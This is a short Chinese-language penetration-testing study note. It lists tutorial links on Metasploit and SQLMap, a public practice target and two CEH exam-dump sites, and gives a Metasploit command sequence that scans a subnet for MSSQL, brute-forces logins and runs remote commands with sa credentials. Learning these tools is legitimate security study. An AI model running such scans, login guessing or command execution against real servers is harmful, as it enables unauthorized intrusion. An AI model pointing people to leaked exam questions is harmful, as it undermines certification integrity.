
#### 靶機 [Altoro Mutual](http://demo.testfire.net/)

[kali linux web渗透测试学习笔记 - 花米徐xl_lx的专栏 - CSDN博客](https://blog.csdn.net/xl_lx/article/details/78399609)

[不只是資安: Metasploit 初體驗](http://cyrilwang.blogspot.com/2008/12/metasploit.html)

[Metasploit的基本使用](http://topspeedsnail.com/kali-linux-metasploit-base-use/)

[雅技資訊日誌: SQLMap 實戰(可怕的 SQL Injection漏洞)](http://atic-tw.blogspot.com/2014/04/sqlmap-sql-injection.html)

[2019 高命中率的Certified Ethical Hacker Exam (CEH v10)題庫平臺 - 最新的312-50v10認證新題庫已出](https://braindumps.testpdf.net/certified-ethical-hacker-exam-ceh-v10-brain-dumps-9810.html?adhit=hat)

[2019 想要順利的拿到Certified Ethical Hacker Exam (CEH v10)考試證書 - 312-50v10考古題是你的第一選擇](https://actualtests.pdfexamdumps.com/certified-ethical-hacker-exam-ceh-v10-actual-9810.html?adhit=hat)

### metasploit msfconsole 命令
https://hk.saowen.com/a/15f0478abbb7f374a272da34d296b07b8be034e35688e372f120ddecf1c64996

#### mssql開發利用

對各個ip是否有mssql服務的探測
```sh
use scanner/mssql/mssql_ping //測試MSSQL的存在和信息
show options
set rhosts 192.168.2.1-255
set threads 30
exploit
對掃描到的ip進行爆破
use scanner/mssql/mssql_login //具體配置show options。
sa權限對其利用
use admin/mssql/mssql_exec
set rhost 192.168.2.10
set password sa
set CMD cmd.exe /c echo hello
exploit
```
